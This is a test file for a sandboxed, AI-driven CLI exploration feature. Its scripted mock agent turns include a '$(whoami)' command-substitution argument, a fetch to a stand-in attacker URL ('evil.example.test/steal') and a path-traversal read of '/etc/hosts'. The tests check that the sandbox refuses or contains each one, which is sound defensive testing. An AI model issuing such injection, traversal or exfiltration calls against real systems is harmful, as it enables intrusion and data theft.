import { execFile } from "node:child_process";
import { readFile, writeFile, mkdtemp, rm, mkdir, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { CliExploreSessionSchema } from "@qajitsu/core";
import { afterEach, describe, expect, it } from "vitest";
import { createDemoPipeline, DEMO_PASSWORD } from "../../../../tests/support/cli-pipeline.js";
import type { Turn } from "../../../../tests/support/mock-model.js";

const TOOL = fileURLToPath(new URL("../../../../fixtures/cli-tool/tool.mjs", import.meta.url));
const cleanups: (() => Promise<void>)[] = [];
afterEach(async () => {
  for (const c of cleanups.splice(0)) await c();
});

/** A demo project with the fictional tool in explore.cli (REQ-EXEC-24/AC7). */
/** Real `ps` (to find the leaked process), no Docker: the test does not depend on the machine's containers. */
const probe = (program: string, args: readonly string[]): Promise<string | undefined> =>
  program === "docker"
    ? Promise.resolve(undefined)
    : new Promise((done) => {
        execFile(program, [...args], { timeout: 15_000 }, (e, out) => {
          done(e ? undefined : out);
        });
      });

const project = async (extra = "") => {
  const p = await createDemoPipeline({ ticket: "DEMO-4", ports: { cliProbe: probe } });
  cleanups.push(p.cleanup);
  const fixture = await mkdtemp(join(tmpdir(), "qj-tool-fixture-"));
  cleanups.push(() => rm(fixture, { recursive: true, force: true }));
  await writeFile(join(fixture, "README.txt"), "fixture of the tool\n");
  await mkdir(join(fixture, "node_modules", "big"), { recursive: true });
  const yaml = join(p.project, ".qa", "qa.project.yaml");
  await writeFile(
    yaml,
    `${await readFile(yaml, "utf8")}
explore:
  cli:
    tool:
      command: [${JSON.stringify(process.execPath)}, ${JSON.stringify(TOOL)}]
      description: A fictional tool with prompts, a server and a leaky subcommand.
      fixture: ${JSON.stringify(fixture)}
      setup: [[${JSON.stringify(process.execPath)}, -e, "require('fs').writeFileSync('seeded.txt', 'from setup')"]]
      env:
        TOOL_TOKEN: { secret: secret://env/DEMO_USER_PASSWORD }
        TOOL_HOME: { value: "{{sandbox}}/home" }
      allowlist: [https://api.example.test]
      timeout_s: 20
${extra}`,
  );
  expect((await p.run(["fetch", "DEMO-4", "--ref", "shop=main"])).exitCode).toBe(0);
  return p;
};

const SESSION: Turn[] = [
  { tools: [{ name: "cli_run", input: { args: ["hello", "$(whoami)"] } }] },
  { tools: [{ name: "cli_run", input: { args: ["ask"], input: ["yes"] } }] },
  { tools: [{ name: "cli_start", input: { args: ["serve"] } }] },
  { tools: [{ name: "cli_signal", input: { background: "B1", signal: "SIGINT", seconds: 10 } }] },
  { tools: [{ name: "cli_run", input: { args: ["orphan"] } }] },
  { tools: [{ name: "cli_run", input: { args: ["env"] } }] },
  { tools: [{ name: "cli_run", input: { args: ["get", "http://evil.example.test/steal"] } }] },
  // Outside the sandbox: refused by code, no action.
  { tools: [{ name: "cli_read", input: { path: "../../../../../../etc/hosts" } }] },
  { tools: [{ name: "cli_read", input: { path: "seeded.txt" } }] },
  { tools: [{ name: "cli_run", input: { args: ["write", "made.txt"] } }] },
  { tools: [{ name: "cli_leftovers", input: {} }] },
  {
    tools: [
      {
        name: "record_observation",
        input: {
          title: "orphan leaves a process running after the command ended",
          kind: "possible-bug",
          severity: "medium",
          description: "The tool exited but a child kept running.",
          steps: ["A05", "A10"],
          expected: "nothing left running",
          actual: "one process still running",
        },
      },
      {
        name: "record_observation",
        input: { title: "Invented", kind: "ux", severity: "low", description: "x", steps: ["A77"] },
      },
    ],
  },
  { text: JSON.stringify({ summary: "Explored the tool; one process leaked." }) },
];

describe("qajitsu explore --cli (REQ-EXEC-24)", () => {
  it("REQ-EXEC-24/AC1-AC5+AC7: explores a configured tool in a sandbox, records every command and cleans everything up", async () => {
    const p = await project();
    const result = await p.run(
      ["explore", "DEMO-4", "--cli", "tool", "--goal", "Try every subcommand", "--max-steps", "20"],
      { script: SESSION },
    );
    expect(result.err).toBe("");
    expect(result.exitCode).toBe(0);
    expect(result.out).toContain("Exploratory session S01 of tool in a sandbox");
    expect(result.out).toContain("O1 [medium] orphan leaves a process running after the command ended");
    const dir = join(p.runDir, "explore", "S01");
    const session = CliExploreSessionSchema.parse(
      JSON.parse(await readFile(join(dir, "session.json"), "utf8")),
    );
    expect(
      session.actions.map((a) => [a.id, a.action, a.args.join(" "), a.exitCode ?? a.endedBy ?? null]),
    ).toEqual([
      ["A01", "run", "hello $(whoami)", 0],
      ["A02", "run", "ask", 0],
      ["A03", "start", "serve", null],
      ["A04", "signal", "", 0],
      ["A05", "run", "orphan", 0],
      ["A06", "run", "env", 0],
      ["A07", "run", "get http://evil.example.test/steal", 0],
      ["A08", "read", "", null],
      ["A09", "run", "write made.txt", 0],
      ["A10", "leftovers", "", null],
    ]);
    expect(session.actions[2]?.running).toBe(true);
    expect(session.actions[8]?.changed).toEqual([`+ ${join("work", "made.txt")}`]);
    // Observations must cite actions of the session; the invented one was refused.
    expect(session.observations.map((o) => [o.id, o.steps])).toEqual([["O1", ["A05", "A10"]]]);
    // AC3+AC5: the leaked process was found and stopped; the proxy refused the host outside the allowlist.
    expect(session.leftovers.processes.some((p) => p.includes("setInterval"))).toBe(true);
    expect(session.cleaned.processes.length).toBeGreaterThan(0);
    expect(session.refusedHosts).toEqual(["evil.example.test:80"]);
    const pid = Number(
      /started (\d+)/.exec(await readFile(join(dir, "evidence", "A05-output.txt"), "utf8"))?.[1],
    );
    expect(() => process.kill(pid, 0)).toThrow();
    // AC2: the tool saw only its own variables; the secret it got is masked everywhere.
    const env = await readFile(join(dir, "evidence", "A06-output.txt"), "utf8");
    expect(env).toContain("TOOL_TOKEN");
    expect(env).toContain("HOME");
    expect(env).not.toContain("DEMO_USER_PASSWORD");
    expect(env).not.toContain(DEMO_PASSWORD);
    expect(await readFile(join(dir, "evidence", "A08-output.txt"), "utf8")).toBe("from setup");
    expect(await readFile(join(dir, "evidence", "setup-1.txt"), "utf8")).toContain("writeFileSync");
    // Every output is in the manifest with its SHA-256.
    const manifest = JSON.parse(await readFile(join(dir, "evidence", "manifest.json"), "utf8")) as {
      path: string;
      sha256: string;
    }[];
    expect(manifest.map((m) => m.path)).toEqual(
      expect.arrayContaining(["A01-output.txt", "A06-output.txt", "setup-1.txt"]),
    );
    expect(manifest.every((m) => /^[0-9a-f]{64}$/.test(m.sha256))).toBe(true);
    // AC5: the review report lists commands, observations, leftovers and refused hosts.
    const html = await readFile(join(dir, "report.html"), "utf8");
    expect(html).toContain("run tool hello $(whoami)");
    expect(html).toContain("O1 · orphan leaves a process running");
    expect(html).toContain("evil.example.test:80");
    expect(html).not.toContain("<script");
    const md = await readFile(join(dir, "report.md"), "utf8");
    expect(md).toContain("## Stopped by the clean-up");
    const journal = await readFile(join(p.runDir, "journal", "events.jsonl"), "utf8");
    expect(journal).toContain('"event":"explore.refused"');
    expect(journal.match(/"event":"explore\.action"/g)?.length).toBe(10);
    // AC6: an observation becomes a regression test proposal written by code from the recorded session.
    const promoted = await p.run(["explore", "promote", "DEMO-4", "--session", "S01", "--observation", "O1"]);
    expect(promoted.exitCode).toBe(0);
    const proposal = await readFile(join(dir, "promotions", "O1.md"), "utf8");
    expect(proposal).toContain("# Regression test proposal: orphan leaves a process running");
    expect(proposal).toContain("1. `tool orphan` → observed: exit code 0");
    expect(proposal).toContain("2. list processes and containers still running");
    expect(proposal).toContain('"action": "run"');
    const missing = await p.run(["explore", "promote", "DEMO-4", "--session", "S01", "--observation", "O9"]);
    expect(missing.exitCode).toBe(3);
    expect(missing.err).toContain("OBSERVATION_NOT_FOUND");
    // The sandbox named in the journal is gone.
    const sandbox = /"event":"explore\.start","details":\{[^}]*"sandbox":"([^"]+)"/.exec(journal)?.[1] ?? "";
    expect(sandbox).toContain("qj-sandbox-");
    expect(await stat(sandbox).catch(() => undefined)).toBeUndefined();
  }, 120_000);

  it("REQ-EXEC-24/AC7: a tool that is not configured is refused; a failing setup ends the session before the agent", async () => {
    const p = await project();
    const unknown = await p.run(["explore", "DEMO-4", "--cli", "rm", "--goal", "x"]);
    expect(unknown.exitCode).toBe(3);
    expect(unknown.err).toContain("CLI_TOOL_UNKNOWN");
    expect(unknown.err).toContain("configured: tool");
    const broken = await project(`    broken:
      command: [${JSON.stringify(process.execPath)}, ${JSON.stringify(TOOL)}]
      setup: [[${JSON.stringify(process.execPath)}, -e, "process.exit(4)"]]`);
    const r = await broken.run(["explore", "DEMO-4", "--cli", "broken", "--goal", "x"], {
      script: [{ text: "never asked" }],
    });
    expect(r.exitCode).toBe(0);
    expect(r.out).toContain("ended: error (setup command 1 (");
    expect(r.out).toContain("ended with exit code 4)");
  }, 120_000);

  it("REQ-EXEC-24/AC8: a summary before any command is rejected and the explorer acts; one that never acts ends the session with an error", async () => {
    const claim = { text: JSON.stringify({ summary: "Tested every command; all exit codes fit." }) };
    const p = await project();
    const r = await p.run(["explore", "DEMO-4", "--cli", "tool", "--goal", "Test everything"], {
      script: [claim, { tools: [{ name: "cli_run", input: { args: ["hello"] } }] }, claim],
    });
    expect(r.exitCode).toBe(0);
    const session = JSON.parse(await readFile(join(p.runDir, "explore", "S01", "session.json"), "utf8")) as {
      endReason: string;
      actions: { args: string[] }[];
    };
    expect(session.endReason).toBe("finished");
    expect(session.actions.map((a) => a.args)).toEqual([["hello"]]);
    const q = await project();
    const never = await q.run(["explore", "DEMO-4", "--cli", "tool", "--goal", "Test everything"], {
      script: [claim, claim, claim],
    });
    expect(never.out).toContain("ended: error (explorer did not produce valid output in 3 attempts.)");
    const failed = JSON.parse(await readFile(join(q.runDir, "explore", "S01", "session.json"), "utf8")) as {
      summary: string;
      actions: unknown[];
    };
    expect(failed.actions).toEqual([]);
    expect(failed.summary).toBe("");
  }, 120_000);

  it("REQ-EXEC-15/AC5 + REQ-EXEC-24/AC1: the step budget is enforced by code", async () => {
    const p = await project();
    const looping: Turn[] = [{ tools: [{ name: "cli_run", input: { args: ["hello"] } }] }];
    const r = await p.run(["explore", "DEMO-4", "--cli", "tool", "--goal", "Loop", "--max-steps", "2"], {
      script: looping,
    });
    expect(r.exitCode).toBe(0);
    const session = JSON.parse(await readFile(join(p.runDir, "explore", "S01", "session.json"), "utf8")) as {
      endReason: string;
      actions: unknown[];
    };
    expect(session.endReason).toBe("step-budget");
    expect(session.actions).toHaveLength(2);
  }, 120_000);
});
